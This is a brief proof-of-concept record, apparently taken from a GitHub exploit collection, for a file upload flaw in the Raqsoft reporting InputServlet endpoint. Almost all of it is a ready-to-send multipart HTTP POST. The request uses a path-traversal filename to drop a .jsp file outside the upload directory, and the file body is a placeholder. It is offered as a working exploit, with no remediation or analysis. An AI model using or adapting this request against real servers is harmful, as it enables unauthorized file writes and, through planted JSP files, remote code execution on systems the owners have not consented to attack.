# raqsoft_InputServlet_fileupload

from: https://github.com/wy876/POC/blob/main/%E6%B6%A6%E4%B9%BE%E6%8A%A5%E8%A1%A8InputServlet%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md

2024.4.8 @2

```
POST /InputServlet?action=12 HTTP/1.1
Host: 127.0.0.1:8080
Content-Type: multipart/form-data; boundary=--------------------------170005680039721412137562
Accept-Encoding: gzip, deflate, br
Content-Length: 2401

----------------------------170005680039721412137562
Content-Disposition: form-data; name="upsize"

1024
----------------------------170005680039721412137562
Content-Disposition: form-data; name="file"; filename="/\..\\..\2.jsp"
Content-Type: image/png

11111
----------------------------170005680039721412137562--
```
